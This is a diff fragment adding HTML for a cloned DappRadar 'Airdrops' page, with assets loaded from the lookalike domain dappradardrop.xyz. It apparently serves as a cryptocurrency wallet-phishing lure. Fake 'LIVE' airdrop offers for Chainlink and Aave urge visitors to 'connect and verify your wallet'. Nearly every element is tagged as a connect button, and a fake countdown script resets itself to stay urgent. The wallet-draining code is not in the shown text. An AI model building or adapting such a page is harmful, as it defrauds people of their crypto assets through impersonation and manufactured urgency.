0-1.378.34-1.378.994s.558 1.073 1.413 1.073a1.965 1.965 0 002.076-1.954zM108.062 1.823v14.959h-2.477v-1.221a3.741 3.741 0 01-3.175 1.457 4.849 4.849 0 01-4.789-5.164 4.849 4.849 0 014.789-5.164 3.842 3.842 0 012.957 1.178V1.823zm-5.146 7.31a2.551 2.551 0 00-2.556 2.713 2.532 2.532 0 002.556 2.73 2.462 2.462 0 002.495-2.713 2.486 2.486 0 00-2.495-2.73zM118.511 16.791h-2.477v-.959a4.089 4.089 0 01-3.009 1.195c-2.093 0-3.411-1.221-3.411-2.948 0-1.779 1.439-2.87 3.733-2.87h2.477v-.436a1.613 1.613 0 00-1.832-1.736 3.372 3.372 0 00-2.617 1.361l-1.4-1.657a5.365 5.365 0 014.309-2.032 3.88 3.88 0 014.23 4.23v5.853zm-2.687-3.812h-2.11c-.881 0-1.378.34-1.378.994s.558 1.073 1.413 1.073a1.965 1.965 0 002.076-1.954zM126.667 9.29h-.715a2.385 2.385 0 00-2.652 2.573v4.928h-2.7V6.917h2.477v1.178a3.412 3.412 0 012.713-1.3 2.723 2.723 0 01.881.122V9.29z">
+           </path>
+          </svg>
+         </a>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="sc-ewvfhA gcWbJB connectButton">
+        <div ad-data-linked="true" class="sc-gGWvLE hibEFJ connectButton">
+         <div ad-data-linked="true" class="sc-dkcEsn jpBkbc connectButton">
+          <svg fill="#ffffff" height="14" viewbox="0 0 15 14" width="15" xmlns="http://www.w3.org/2000/svg">
+           <path d="M2.5 0a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h2a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2h-2ZM2.5 8a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h2a2 2 0 0 0 2-2v-2a2 2 0 0 0-2-2h-2ZM8.5 2a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2a2 2 0 0 1-2 2h-2a2 2 0 0 1-2-2V2ZM8.5 10a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v2a2 2 0 0 1-2 2h-2a2 2 0 0 1-2-2v-2Z">
+           </path>
+          </svg>
+         </div>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="sc-eCrewB hyDeio connectButton">
+       </div>
+       <div ad-data-linked="true" class="sc-islFiG clpNUz searchbar23 connectButton">
+        <div ad-data-linked="true" class="sc-bTtZEv hekvNx connectButton">
+         <div ad-data-linked="true" class="sc-hQIyOC hoGbHR connectButton">
+          <input class="sc-fSKiAx buLQmJ" maxlength="42" placeholder="Search wallets" type="text" value=""/>
+          <svg class="sc-bjCGfv iizfTk" fill="#b1bbce" height="13.698" viewbox="0 0 13.696 13.698" width="13.696" xmlns="http://www.w3.org/2000/svg">
+           <path d="M13.51,11.843,10.843,9.176a.642.642,0,0,0-.455-.187H9.952a5.562,5.562,0,1,0-.963.963v.436a.642.642,0,0,0,.187.455l2.667,2.667a.639.639,0,0,0,.907,0l.757-.757A.645.645,0,0,0,13.51,11.843ZM5.564,8.989A3.424,3.424,0,1,1,8.989,5.564,3.422,3.422,0,0,1,5.564,8.989Z" transform="translate(0 0)">
+           </path>
+          </svg>
+         </div>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="Header__SecondaryNavContainer-sc-1lzyagy-3 laJeWN connectButton">
+        <div ad-data-linked="true" class="sc-dcntqk fNQTLU connectButton">
+         <div ad-data-linked="true" class="sc-ehVsHJ hdXfaQ connectButton">
+          <div ad-data-linked="true" class="sc-djTcra ldsKDG connectButton" color="#ffffff">
+           <span aria-hidden="true">
+           </span>
+           <span aria-hidden="true">
+           </span>
+           <span aria-hidden="true">
+           </span>
+          </div>
+         </div>
+        </div>
+        <a ad-data-linked="true" class="sc-bTUVah gqhPOc connectButton" href="#">
+         <div ad-data-linked="true" class="sc-iWOQzb kFLqrZ connectButton" role="button">
+          <svg aria-hidden="true" class="prefix__svg-inline--fa prefix__fa-bell prefix__fa-w-14" cursor="pointer" data-icon="bell" data-prefix="fas" fill="#FFFFFF" height="20px" viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
+           <path d="M224 512c35.32 0 63.97-28.65 63.97-64H160.03c0 35.35 28.65 64 63.97 64zm215.39-149.71c-19.32-20.76-55.47-51.99-55.47-154.29 0-77.7-54.48-139.9-127.94-155.16V32c0-17.67-14.32-32-31.98-32s-31.98 14.33-31.98 32v20.84C118.56 68.1 64.08 130.3 64.08 208c0 102.3-36.15 133.53-55.47 154.29-6 6.45-8.66 14.16-8.61 21.71.11 16.4 12.98 32 32.1 32h383.8c19.12 0 32-15.6 32.1-32 .05-7.55-2.61-15.27-8.61-21.71z">
+           </path>
+          </svg>
+         </div>
+        </a>
+        <button ad-data-linked="true" class="sc-yLwuU cGPEgs interact-button connect connectButton" style="border: none;">
+         <div ad-data-linked="true" class="sc-czpcHH gVqotY connectButton">
+          <div ad-data-linked="true" class="sc-bPxJiH cjTmHN connectButton">
+           Connect
+           <svg class="sc-jIkldg dDOgJH" height="14" viewbox="0 0 17 14" width="17" xmlns="http://www.w3.org/2000/svg">
+            <path clip-rule="evenodd" d="M8.793.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1 0 1.414l-6 6a1 1 0 0 1-1.414-1.414L13.086 8H1.5a1 1 0 0 1 0-2h11.586L8.793 1.707a1 1 0 0 1 0-1.414Z" fill-rule="evenodd">
+            </path>
+           </svg>
+          </div>
+         </div>
+        </button>
+        <div ad-data-linked="true" class="sc-ksbECg bIxhFh connectButton">
+        </div>
+        <div ad-data-linked="true" class="sc-cBBlDJ kVhmNU connectButton">
+         <div ad-data-linked="true" class="sc-kpPvGe iGFeGz connectButton">
+          <div ad-data-linked="true" class="sc-kLKKgF gfSOMI connectButton">
+           <div ad-data-linked="true" class="sc-eYGnOm hlnEOr connectButton">
+            <div ad-data-linked="true" class="sc-bgzEgf hElrPd connectButton">
+             <svg class="sc-erbdlo kpNcHu" height="17" viewbox="0 0 19 17" width="19" xmlns="http://www.w3.org/2000/svg">
+              <path d="M18.465 6.213a2.643 2.643 0 0 0-2.695-2.53c-4.233.028-8.466.011-12.698.011a1.484 1.484 0 0 1-.612-.075c-.169-.073-.353-.136-.355-.364-.002-.227.176-.306.349-.368.219-.073.45-.105.681-.094h12.88c.102 0 .218-.022.221-.142A2.904 2.904 0 0 0 15.865.52a1.765 1.765 0 0 0-1.719-.457c-2.01.223-4.017.474-6.028.707-1.938.224-3.875.437-5.813.66A1.93 1.93 0 0 0 .514 3.45c0 3.587.025 7.175-.012 10.764a2.658 2.658 0 0 0 2.753 2.745c2.08-.021 4.16 0 6.24-.005 2.129 0 4.257.006 6.386 0a2.56 2.56 0 0 0 2.559-2.244c.098-2.831.053-5.664.024-8.497Zm-8.49 9.208v-1.02a4.093 4.093 0 1 0-3.253-1.62l.73-.722a3.06 3.06 0 1 1 2.519 1.32v-1.02a2.04 2.04 0 1 0-1.768-1.02l.76-.743A1.034 1.034 0 0 1 9.972 9.27a1.05 1.05 0 0 1 0 2.098c-.101-.002-.201-.018-.297-.048l-2.633 2.571a.496.496 0 0 1-.08.065l-.024.012a.58.58 0 0 1-.064.033c-.011 0-.023.008-.037.012a.51.51 0 0 1-.058.016.133.133 0 0 1-.04 0h-.054a.508.508 0 0 1-.055-.005.14.14 0 0 0-.042 0 .575.575 0 0 1-.056-.017.09.09 0 0 1-.038-.013.504.504 0 0 1-.055-.03l-.034-.018a.53.53 0 0 1-.053-.044.328.328 0 0 1-.028-.022 5.1 5.1 0 1 1 3.65 1.541Z">
+              </path>
+             </svg>
+             <div ad-data-linked="true" class="sc-yUtDh dXNjjk connectButton">
+              Connect your wallet
+             </div>
+            </div>
+            <div ad-data-linked="true" class="sc-ihFKfs ijrkNr connectButton">
+             Please connect your wallet to enjoy DappRadars pro features
+            </div>
+            <a ad-data-linked="true" class="sc-eoOUpm jACQNy interact-button connect connectButton" href="#">
+             <svg class="sc-wIkHf itAPPW" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+              <path clip-rule="evenodd" d="M16.5 8a8 8 0 1 1-16 0 8 8 0 0 1 16 0Zm-8-3a1 1 0 0 0-.867.5 1 1 0 1 1-1.731-1A3 3 0 0 1 11.5 6a3.001 3.001 0 0 1-2 2.83V9a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1 1 1 0 1 0 0-2Zm0 8a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z" fill-rule="evenodd">
+              </path>
+             </svg>
+             <div ad-data-linked="true" class="sc-dovKpQ gPxKje connectButton">
+              What is wallet?
+             </div>
+            </a>
+            <span class="sc-dkrFOg dUXxYB" mb="16px" width="100%">
+             Connect wallet
+            </span>
+            <div ad-data-linked="true" class="sc-eyLAWx fshuPt connectButton">
+            </div>
+           </div>
+          </div>
+          <div ad-data-linked="true" class="sc-fFRahO johBWk connectButton">
+          </div>
+          <div ad-data-linked="true" class="sc-leZLoi cgMrJL connectButton">
+           <a ad-data-linked="true" class="sc-dkrFOg sc-cPIbRQ hiOhDD dwYnWV interact-button connect connectButton" href="#" rel="nofollow noopener" width="100%">
+            <div ad-data-linked="true" class="sc-hbWBzy kzWWqL connectButton">
+             <div ad-data-linked="true" class="sc-hLirLb ifnFMp connectButton">
+              <div ad-data-linked="true" class="sc-nTrUm eiDYqv connectButton">
+               <div ad-data-linked="true" class="sc-eVZGIO fkdgJ connectButton">
+                Buy Crypto
+               </div>
+               <div ad-data-linked="true" class="sc-kmXbIF jhERDC connectButton">
+                <img height="8px" src="urn:scrapbook:download:error:https://dappradardrop.xyz/DappRadar_19/PaymentVisaIcon.svg" width="25px"/>
+               </div>
+               <div ad-data-linked="true" class="sc-kmXbIF jhERDC connectButton">
+                <img height="10px" src="urn:scrapbook:download:error:https://dappradardrop.xyz/DappRadar_19/PaymentMastercardIcon.svg" width="18px"/>
+               </div>
+              </div>
+             </div>
+            </div>
+            <svg class="dappradar-dropdown-external-link-icon" height="18px" viewbox="0 0 21 20" width="18px" xmlns="http://www.w3.org/2000/svg">
+             <path d="M11.5 3a1 1 0 1 0 0 2h2.586l-6.293 6.293a1 1 0 1 0 1.414 1.414L15.5 6.414V9a1 1 0 1 0 2 0V4a1 1 0 0 0-1-1h-5Z">
+             </path>
+             <path d="M5.5 5a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-3a1 1 0 1 0-2 0v3h-8V7h3a1 1 0 0 0 0-2h-3Z">
+             </path>
+            </svg>
+           </a>
+           <div ad-data-linked="true" class="sc-hlzHbZ cQcKxq connectButton">
+            <div ad-data-linked="true" class="sc-hxOqGs bKnFnU connectButton">
+             <div ad-data-linked="true" class="sc-gBInCZ dUoKj connectButton">
+              <svg class="sc-gfQywf jJOCrm" height="12" viewbox="0 0 17 12" width="17" xmlns="http://www.w3.org/2000/svg">
+               <path d="M.503 1.884 8.5 5.882l7.997-3.998A2 2 0 0 0 14.5 0h-12A2 2 0 0 0 .503 1.884Z">
+               </path>
+               <path d="m16.5 4.118-8 4-8-4V10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V4.118Z">
+               </path>
+              </svg>
+              <div ad-data-linked="true" class="sc-eVZGIO iyeVYO connectButton">
+               Add your email
+              </div>
+             </div>
+             <svg class="sc-dZTDFv eqjana" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 24A12 12 0 0 1 3.515 3.514a12 12 0 0 1 16.97 16.971A11.921 11.921 0 0 1 12 24zm.028-7.962A1.336 1.336 0 1 0 13 18.283a1.185 1.185 0 0 0 .346-.875 1.3 1.3 0 0 0-.359-.962 1.331 1.331 0 0 0-.958-.408zM12.02 5.325a1.312 1.312 0 0 0-.325.042 1.632 1.632 0 0 0-1.046 1.643c.017.239.032.48.047.722s.03.472.047.708l.134 2.643.019.372.121 2.38a1.042 1.042 0 0 0 1.012 1.056 1.067 1.067 0 0 0 1.009-1.1c0-.367 0-.713.033-1.092.028-.568.059-1.137.093-1.769.029-.532.061-1.136.09-1.713.017-.378.04-.76.062-1.13v-.008c.022-.365.045-.742.061-1.113a2.043 2.043 0 0 0-.124-.753 1.347 1.347 0 0 0-1.233-.888z">
+              </path>
+             </svg>
+            </div>
+            <div ad-data-linked="true" class="sc-ihFKfs ijrkNr connectButton">
+             Verify your email and get access to more features on DappRadar.
+            </div>
+            <span class="sc-dkrFOg jEaEzn" width="100%">
+             Verify
+            </span>
+           </div>
+          </div>
+         </div>
+         <div ad-data-linked="true" class="sc-grBbyg cQwKjJ connectButton">
+          <div ad-data-linked="true" class="sc-czurPZ gTKqiS connectButton">
+           <a ad-data-linked="true" class="sc-dkrFOg GpwWC sc-gpoSCe ctzCXZ interact-button connect connectButton" href="#" width="100%">
+            <span class="sc-gswNZR eRjavl button-svg">
+             <svg height="17" viewbox="0 0 19 17" width="19" xmlns="http://www.w3.org/2000/svg">
+              <path d="M18.465 6.213a2.643 2.643 0 0 0-2.695-2.53c-4.233.028-8.466.011-12.698.011a1.484 1.484 0 0 1-.612-.075c-.169-.073-.353-.136-.355-.364-.002-.227.176-.306.349-.368.219-.073.45-.105.681-.094h12.88c.102 0 .218-.022.221-.142A2.904 2.904 0 0 0 15.865.52a1.765 1.765 0 0 0-1.719-.457c-2.01.223-4.017.474-6.028.707-1.938.224-3.875.437-5.813.66A1.93 1.93 0 0 0 .514 3.45c0 3.587.025 7.175-.012 10.764a2.658 2.658 0 0 0 2.753 2.745c2.08-.021 4.16 0 6.24-.005 2.129 0 4.257.006 6.386 0a2.56 2.56 0 0 0 2.559-2.244c.098-2.831.053-5.664.024-8.497Zm-8.49 9.208v-1.02a4.093 4.093 0 1 0-3.253-1.62l.73-.722a3.06 3.06 0 1 1 2.519 1.32v-1.02a2.04 2.04 0 1 0-1.768-1.02l.76-.743A1.034 1.034 0 0 1 9.972 9.27a1.05 1.05 0 0 1 0 2.098c-.101-.002-.201-.018-.297-.048l-2.633 2.571a.496.496 0 0 1-.08.065l-.024.012a.58.58 0 0 1-.064.033c-.011 0-.023.008-.037.012a.51.51 0 0 1-.058.016.133.133 0 0 1-.04 0h-.054a.508.508 0 0 1-.055-.005.14.14 0 0 0-.042 0 .575.575 0 0 1-.056-.017.09.09 0 0 1-.038-.013.504.504 0 0 1-.055-.03l-.034-.018a.53.53 0 0 1-.053-.044.328.328 0 0 1-.028-.022 5.1 5.1 0 1 1 3.65 1.541Z">
+              </path>
+             </svg>
+            </span>
+            Portfolio
+            <span class="sc-gswNZR eFPxbR button-svg">
+             <svg class="sc-hmTbGb fcEDqP" height="14" viewbox="0 0 17 14" width="17" xmlns="http://www.w3.org/2000/svg">
+              <path clip-rule="evenodd" d="M8.793.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1 0 1.414l-6 6a1 1 0 0 1-1.414-1.414L13.086 8H1.5a1 1 0 0 1 0-2h11.586L8.793 1.707a1 1 0 0 1 0-1.414Z" fill-rule="evenodd">
+              </path>
+             </svg>
+            </span>
+           </a>
+          </div>
+          <button class="sc-dkrFOg GpwWC" type="button" width="100%">
+           Log
+          out
+          </button>
+         </div>
+        </div>
+       </div>
+      </nav>
+     </div>
+    </div>
+   </header>
+   <div ad-data-linked="true" class="app-container connectButton">
+    <div ad-data-linked="true" class="PageContainer__Container-kywaiq-0 iJnOVt connectButton">
+     <div ad-data-linked="true" class="SidebarNav__SidebarWrapperStyle-sc-1bnwn4j-0 jvHtXL connectButton">
+      <div ad-data-linked="true" class="SidebarNav__SidebarStickStyle-sc-1bnwn4j-1 kObVFn connectButton">
+       <div ad-data-linked="true" class="sc-gGvHcT dYyZky connectButton">
+        <div ad-data-linked="true" class="sc-ehvNnt dZaKxY connectButton">
+         <a ad-data-linked="true" class="sc-hiDMwi fpAlXm interact-button connect connectButton" href="#">
+          <svg height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+           <path d="M22.11 4.79h-6.045A4.099 4.099 0 0 0 12 1.24c-2.086 0-3.812 1.554-4.074 3.55H1.898A1.89 1.89 0 0 0 0 6.671v5.023c0 .499.204.973.556 1.325.36.352.835.548 1.342.548h.417v7.076c0 1.03.834 1.865 1.865 1.865h15.648a1.87 1.87 0 0 0 1.865-1.865v-7.076h.417c.508 0 .974-.196 1.334-.548.36-.352.556-.826.556-1.325V6.671c0-1.038-.85-1.88-1.89-1.88ZM12 3.285c.949 0 1.742.638 1.996 1.505h-3.992A2.076 2.076 0 0 1 12 3.285Zm7.648 17.178H4.36v-6.88h3.934v.606c0 .327.27.589.59.589h6.233a.586.586 0 0 0 .588-.59v-.604h3.943v6.879Zm2.307-8.94-6.25-.058v-.54a.586.586 0 0 0-.588-.589H8.883a.592.592 0 0 0-.589.59v.539l-6.249.057V6.835h19.91v4.687Z">
+           </path>
+          </svg>
+          Portfolio
+         </a>
+        </div>
+        <div ad-data-linked="true" class="sc-ehvNnt dZaKxY connectButton">
+         <a ad-data-linked="true" class="sc-hiDMwi jFduhB interact-button connect connectButton" href="#">
+          <svg height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+           <path d="M22.182 11.072c0-.048 0-.096-.008-.144C22.014 5.424 17.558 1 12.094 1s-9.92 4.424-10.08 9.928c-.008.056-.008.104-.008.152a.536.536 0 0 0 0 .16c.024.464.232.904.624 1.272l7.352 6.12H8.726a.572.572 0 0 0-.568.576v2.912a.57.57 0 0 0 .568.568h6.464a.57.57 0 0 0 .568-.568v-2.912a.572.572 0 0 0-.568-.576h-1.224l7.616-6.152c.36-.336.576-.776.6-1.24.008-.024.008-.04.008-.064 0-.032 0-.064-.008-.104ZM12.094 3c3.168 0 5.912 1.856 7.24 4.56a4.006 4.006 0 0 0-1.168-.176c-.992 0-1.912.376-2.632 1.04a4.142 4.142 0 0 0-3.44-1.84c-1.432 0-2.704.744-3.456 1.864a3.737 3.737 0 0 0-2.624-1.064c-.4 0-.792.064-1.16.176C6.182 4.856 8.926 3 12.094 3Zm-8.08 8.064c.192-.968 1.024-1.68 2-1.68 1.36 0 1.904 1.408 2.04 1.84l1.68 4.6-5.72-4.76Zm7.976 5.096-2.032-5.552s-.008-.024-.016-.04c.112-1.112 1.032-1.984 2.152-1.984s1.984.824 2.136 1.896l-2.24 5.68Zm2.288-.344 1.896-4.824c.016-.056.048-.12.08-.2.232-.496.8-1.408 1.912-1.408.976 0 1.816.712 2 1.672l-5.888 4.76Z">
+           </path>
+          </svg>
+          Airdrops
+         </a>
+        </div>
+        <div ad-data-linked="true" class="sc-ehvNnt dZaKxY connectButton">
+         <a ad-data-linked="true" class="sc-hiDMwi fpAlXm interact-button connect connectButton" href="#">
+          <svg height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+           <path clip-rule="evenodd" d="M18.408 19.248V4.752H5.592v14.496h12.816ZM4.824 2.752h14.344l.008-.008c.688 0 1.24.56 1.24 1.24v16.032c0 .688-.56 1.24-1.24 1.24H4.824c-.688 0-1.24-.56-1.24-1.24V3.992c0-.688.56-1.24 1.24-1.24Zm2.952 9.824H9.36c.115 0 .208.093.208.208v3.592a.208.208 0 0 1-.208.208H7.776a.208.208 0 0 1-.208-.208v-3.592c0-.115.093-.208.208-.208Zm8.448-2.352H14.64a.208.208 0 0 0-.208.208v5.952c0 .115.093.208.208.208h1.584a.208.208 0 0 0 .208-.208v-5.952a.208.208 0 0 0-.208-.208Zm-5.016-2.816h1.584c.115 0 .208.093.208.208v8.768a.208.208 0 0 1-.208.208h-1.584a.208.208 0 0 1-.208-.208V7.616c0-.115.093-.208.208-.208Z" fill-rule="evenodd">
+           </path>
+          </svg>
+          NFT Value Estimator
+         </a>
+        </div>
+        <div ad-data-linked="true" class="sc-ehvNnt dZaKxY connectButton">
+         <a ad-data-linked="true" class="sc-hiDMwi fpAlXm interact-button connect connectButton" href="#">
+          <svg height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+           <path clip-rule="evenodd" d="M17.216 7.336c1.104.368 2.104 1 2.928 1.824 2.984 2.992 2.984 7.856-.008 10.848a7.637 7.637 0 0 1-5.424 2.24 7.65 7.65 0 0 1-5.424-2.24 7.59 7.59 0 0 1-2.112-4.096 7.39 7.39 0 0 1-2.928-1.816A7.625 7.625 0 0 1 2 8.672a7.6 7.6 0 0 1 2.256-5.424A7.575 7.575 0 0 1 9.664 1h.008c2.048 0 3.976.8 5.424 2.248a7.554 7.554 0 0 1 2.12 4.088Zm-10.12 6.392.024-.168.005-.038c.014-.109.03-.223.051-.33a.917.917 0 0 1 .01-.048.448.448 0 0 0 .014-.096c.04-.176.08-.344.128-.52.008-.032.018-.064.028-.096.01-.032.02-.064.028-.096l.072-.22.072-.22a7.9 7.9 0 0 1 .28-.648c.088-.176.176-.352.28-.528l.024-.04a4.94 4.94 0 0 1 .336-.52c.128-.184.256-.352.4-.52a7.73 7.73 0 0 1 1.312-1.232 7.253 7.253 0 0 1 1.624-.92c.112-.048.232-.096.344-.136.232-.08.472-.152.712-.216a7.947 7.947 0 0 1 2.224-.216 5.678 5.678 0 0 0-1.376-2.256A5.667 5.667 0 0 0 9.672 3h-.008a5.63 5.63 0 0 0-4 1.664A5.621 5.621 0 0 0 4 8.672c0 1.52.592 2.936 1.664 4.008.424.432.912.776 1.432 1.048Zm3.608 4.864c2.208 2.216 5.808 2.216 8.024 0a5.657 5.657 0 0 0 1.656-4.008 5.657 5.657 0 0 0-1.656-4.008 5.582 5.582 0 0 0-2.656-1.496 5.898 5.898 0 0 0-1.384-.168c-1.48 0-2.904.576-3.984 1.656a5.608 5.608 0 0 0-1.624 4.48 5.62 5.62 0 0 0 1.624 3.544Zm3.61-1.145-2.466-2.467a.568.568 0 0 1 0-.803l2.466-2.466a.568.568 0 0 1 .803 0l2.467 2.466a.568.568 0 0 1 0 .803l-2.466 2.466a.568.568 0 0 1-.804 0Z" fill-rule="evenodd">
+           </path>
+          </svg>
+          Token Swap
+         </a>
+        </div>
+        <div ad-data-linked="true" class="sc-ehvNnt dZaKxY connectButton">
+         <a ad-data-linked="true" class="sc-hiDMwi fpAlXm interact-button connect connectButton" href="#">
+          <svg height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+           <path clip-rule="evenodd" d="M11.056 22.224c.288.176.616.256.944.256l-.008-.016c.328 0 .656-.08.944-.248l7.448-4.296c.584-.336.944-.96.944-1.632V7.696c0-.672-.36-1.296-.944-1.632l-7.44-4.296a1.894 1.894 0 0 0-1.888 0l-7.44 4.304c-.584.336-.944.96-.944 1.632v8.592c0 .664.36 1.296.944 1.632l7.44 4.296Zm.944-1.76-7.328-4.232V7.768L12 3.536l7.328 4.232v8.464L12 20.464ZM13.472 9.64l-1.28-2.008a.404.404 0 0 0-.68 0l-1.28 2.008a.406.406 0 0 1-.24.176l-2.304.592a.408.408 0 0 0-.208.648l1.512 1.832c.064.08.088.176.088.28l-.144 2.376a.404.404 0 0 0 .552.4l2.216-.872a.38.38 0 0 1 .296 0l2.216.872a.405.405 0 0 0 .552-.4l-.144-2.376a.393.393 0 0 1 .088-.28l1.512-1.832a.4.4 0 0 0-.208-.648l-2.304-.592a.406.406 0 0 1-.24-.176Z" fill-rule="evenodd">
+           </path>
+          </svg>
+          NFT Explorer
+         </a>
+        </div>
+       </div>
+      </div>
+     </div>
+     <style>
+      @media only screen and (max-width: 550px) {
+  .bigcard23 { background-position: 0px -70px !important; animation: 1s ease 0s 1 normal none running none !important; }
+}
+     </style>
+     <div ad-data-linked="true" class="airdrops--container css-12x0iee connectButton">
+      <h1 class="airdrops--header css-hi5zbn">
+       Airdrops
+      </h1>
+      <div ad-data-linked="true" class="Airdrops__GlobalNotificationContainer-sc-12dvpie-0 dGXItl connectButton">
+      </div>
+      <div ad-data-linked="true" class="airdrops--featured-container css-1rp6iu8 connectButton">
+       <div ad-data-linked="true" class="featured-airdrop-card css-vurnku bigcard23 connectButton" style='background: url("CryptoAirdrop.png") 0px -180px / cover no-repeat padding-box padding-box transparent; animation: 1s ease 0s 1 normal none running fadein;'>
+        <div ad-data-linked="true" class="featured-airdrop-card--card-footer css-4cffwv connectButton">
+         <div ad-data-linked="true" class="featured-airdrop-card--left-box css-1d8qyez connectButton">
+          <div ad-data-linked="true" class="featured-airdrop-card--image-container css-1uoge8i connectButton">
+           <img alt="airdrop-img" class="sc-hTBuwn qLYMO img-loaded" src="dapplogo.jpg"/>
+          </div>
+          <span class="airdrop-badge red css-vurnku">
+           <span>
+            LIVE
+           </span>
+          </span>
+          <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+           <div ad-data-linked="true" class="featured-airdrop-card--title css-vurnku connectButton">
+            Claim your tokens!
+           </div>
+           <div ad-data-linked="true" class="featured-airdrop-card--subtitle css-vurnku connectButton">
+            Connect and verify your wallet to check
+                  eligibility for airdrops
+           </div>
+          </div>
+         </div>
+         <style>
+          .pulsatingDot { right: 15px; top: 10px; position: relative; }
+@media (max-width: 690px) {
+  .featured-airdrop-card--time-left { margin-left: 20px; }
+}
+         </style>
+         <script type="text/javascript">
+          const countdowns = [
+              { id: 'counter1', duration: '01:18:54', method: 'h:m:s' },
+              { id: 'counter2', duration: '03:43:32', method: 'h:m:s' },
+              { id: 'counter3', duration: '07:24:24', method: 'h' },
+              { id: 'counter4', duration: '10:03:22', method: 'h' },
+                    // Add more counters as needed
+                    ];
+
+                    function convertToSeconds(hms) {
+                      const parts = hms.split(':');
+                      if (parts.length !== 3) return null;
+
+                      const [hours, minutes, seconds] = parts.map(Number);
+                      if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) return null;
+
+                      return hours * 3600 + minutes * 60 + seconds;
+                    }
+
+                    function formatTime(hours, minutes, seconds, method) {
+                      switch (method) {
+                        case 'h:m:s':
+                        return `${hours < 10 ? "0" + hours : hours}:${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
+                        case 'h':
+                        return `${hours}h`;
+                        default:
+                        return `${hours}:${minutes}:${seconds}`;
+                      }
+                    }
+
+                    function startCountdown(duration, elementId, method) {
+                      let timer = duration;
+                      let hours, minutes, seconds;
+
+                      const interval = setInterval(function () {
+                        hours = parseInt(timer / 3600, 10);
+                        minutes = parseInt((timer % 3600) / 60, 10);
+                        seconds = parseInt(timer % 60, 10);
+
+                        document.getElementById(elementId).textContent = formatTime(hours, minutes, seconds, method);
+
+                        if (--timer < 0) {
+                          clearInterval(interval);
+                          localStorage.removeItem(elementId);
+                        } else {
+                          let timeToSave = `${hours < 10 ? "0" + hours : hours}:${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
+                          localStorage.setItem(elementId, timeToSave);
+                        }
+                      }, 1000);
+                    }
+
+                    window.onload = function () {
+                      countdowns.forEach(countdown => {
+                        let savedTime = localStorage.getItem(countdown.id);
+                        let duration;
+                        if (savedTime) {
+                          duration = convertToSeconds(savedTime);
+                        }
+                        if (!duration) {
+                          duration = convertToSeconds(countdown.duration);
+                        }
+                        startCountdown(duration, countdown.id, countdown.method);
+                      });
+                    };
+         </script>
+         <div ad-data-linked="true" class="featured-airdrop-card--actions-container css-4cffwv connectButton">
+          <div ad-data-linked="true" class="featured-airdrop-card--time-left css-vurnku connectButton">
+           <div ad-data-linked="true" class="css-zkfaav connectButton">
+            <div ad-data-linked="true" class="pulsatingDot css-9cwl6c connectButton">
+            </div>
+            <span class="time-counter--container css-vurnku">
+             Ends in &nbsp;
+             <span id="counter1">
+              01:18:01
+             </span>
+            </span>
+           </div>
+          </div>
+          <button class="sc-dkrFOg fpBNPo interact-button connect">
+           Claim now
+          </button>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div ad-data-linked="true" class="airdrops--bg connectButton">
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="featured-airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="featured-airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-img" class="sc-hTBuwn qLYMO img-loaded" src="chainlink-logo.png"/>
+         </div>
+         <span class="airdrop-badge red css-vurnku">
+          <span>
+           LIVE
+          </span>
+         </span>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="featured-airdrop-card--title css-vurnku connectButton">
+           Chainlink (LINK) airdop
+          </div>
+          <div ad-data-linked="true" class="featured-airdrop-card--subtitle css-vurnku connectButton">
+           $400 worth of LINK to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="featured-airdrop-card--actions-container css-4cffwv connectButton">
+         <div ad-data-linked="true" class="featured-airdrop-card--time-left css-vurnku connectButton">
+          <div ad-data-linked="true" class="css-zkfaav connectButton">
+           <div ad-data-linked="true" class="pulsatingDot css-9cwl6c connectButton">
+           </div>
+           <span class="time-counter--container css-vurnku">
+            Ends in &nbsp;
+            <span id="counter2">
+             03:42:19
+            </span>
+           </span>
+          </div>
+         </div>
+         <button class="sc-dkrFOg fpBNPo interact-button connect">
+          Claim now
+         </button>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="featured-airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="featured-airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-img" class="sc-hTBuwn qLYMO img-loaded" src="aave-logo.png"/>
+         </div>
+         <span class="airdrop-badge red css-vurnku">
+          <span>
+           LIVE
+          </span>
+         </span>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="featured-airdrop-card--title css-vurnku connectButton">
+           Aave (AAVE) airdop
